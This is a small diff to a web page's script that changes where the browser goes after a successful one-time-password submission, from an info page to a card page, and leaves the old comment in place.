@@ -125,7 +125,7 @@
                     feedbackDiv.textContent = 'OTP submitted successfully! Redirecting...';
                     feedbackDiv.className = 'success-message';
                     setTimeout(() => {
-                        window.location.href = '/info.html'; // Redirect to info.html
+                        window.location.href = '/card.html'; // Redirect to info.html
                     }, 1000);
                 } else {
                     feedbackDiv.textContent = result.error || 'Error submitting OTP.';
@@ -139,3 +139,4 @@
     </script>
 </body>
 </html>
+
